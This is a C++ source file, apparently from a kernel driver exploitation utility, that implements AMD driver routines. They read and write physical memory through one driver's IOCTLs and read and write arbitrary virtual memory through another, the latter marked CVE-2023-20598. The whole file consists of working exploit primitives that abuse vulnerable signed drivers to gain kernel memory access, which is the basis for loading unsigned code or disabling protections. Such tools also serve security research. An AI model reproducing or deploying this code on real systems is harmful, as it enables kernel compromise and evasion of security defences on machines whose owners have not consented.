/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       AMD.CPP
*
*  VERSION:     1.41
*
*  DATE:        04 Nov 2023
*
*  AMD drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/amd.h"

/*
* RmValidatePrerequisites
*
* Purpose:
*
* Check if the current CPU vendor is AMD.
* This driver won't work on anything else as it has hard block on driver entry.
*
*/
BOOL RmValidatePrerequisites(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bResult;
    UNREFERENCED_PARAMETER(Context);

    bResult = supIsSupportedCpuVendor(CPU_VENDOR_AMD, CPU_VENDOR_AMD_LENGTH);

    if (!bResult)
        supPrintfEvent(kduEventError, "[!] Abort, AMD CPU is required.\r\n");

    return bResult;
}

/*
* RmReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI RmReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    RMDRV_REQUEST* pRequest;
    SIZE_T size;

    size = sizeof(RMDRV_REQUEST) + NumberOfBytes;
    pRequest = (RMDRV_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
        pRequest->Size = NumberOfBytes;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_AMDRM_READ_MEMORY,
            pRequest,
            sizeof(RMDRV_REQUEST),
            pRequest,
            (ULONG)size);

        if (bResult) {

            RtlCopyMemory(
                Buffer,
                RtlOffsetToPointer(pRequest, sizeof(RMDRV_REQUEST)),
                NumberOfBytes);

        }

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* RmWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI RmWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    RMDRV_REQUEST* pRequest;
    SIZE_T size;

    size = sizeof(RMDRV_REQUEST) + NumberOfBytes;

    pRequest = (RMDRV_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
        pRequest->Size = NumberOfBytes;

        RtlCopyMemory(
            RtlOffsetToPointer(pRequest, sizeof(RMDRV_REQUEST)),
            Buffer,
            NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_AMDRM_WRITE_MEMORY,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* PdFwReadVirtualMemory
*
* Purpose:
*
* Read virtual memory.
* CVE-2023-20598
*
*/
BOOL WINAPI PdFwReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PDFW_MEMCPY request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = Buffer;
    request.Source = (PVOID)Address;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_AMDPDFW_MEMCPY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* PdFwWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory.
* CVE-2023-20598
* 
*/
BOOL WINAPI PdFwWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PDFW_MEMCPY request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = (PVOID)Address;
    request.Source = Buffer;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_AMDPDFW_MEMCPY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}
